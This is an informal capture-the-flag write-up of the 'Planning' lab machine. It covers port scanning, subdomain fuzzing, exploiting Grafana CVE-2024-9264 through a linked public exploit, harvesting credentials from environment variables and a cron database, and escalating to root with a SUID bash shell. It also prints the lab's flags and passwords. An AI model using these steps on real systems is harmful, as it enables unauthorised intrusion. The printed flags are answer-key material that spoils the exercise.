# Open Ports

```rb
Increasing send delay for 10.10.11.68 from 0 to 5 due to 28 out of 69 dropped probes since last increase.
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 22 10:19:49 2025 -- 1 IP address (1 host up) scanned in 84.61 seconds
```


# Vhosts


```rb
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H "Host:FUZZ.planning.htb" -fs 178
```

FOUND : grafana Running at grafana.planning.htb


Grafana Version 11.0.0


# Exploit

`v11.0.0 is vuln. to **CVE-2024-9264**-RCE-Exploit in Grafana via SQL Expressions`


https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit



# User Found
`In the env variables we found User: enzo Password:` RioTecRANDEntANT!
```rb
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=passwd
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
TERM=xterm-256color
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/etc

```


# UserFlag

599b4ae734f9feef0c92e0452b4dc35f



# PE

1. We found service running on port 8000  (but requires Creds)
2. Creds found at : /opt/crontab/crontab.js

cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}


USERNAME = root
Password= P4ssw0rdS0pRi0T3c


# Added A cronjob 

![[Pasted image 20250630210202.png]]

In the ssh shell

```sh
enzo@planning:/tmp$ ./bash -p
bash-5.2# 
```

## YYAYAYAYAYAYYAYYAYAYAY Rooottttt


5c765f4378db2d97087ffcea5d257ba1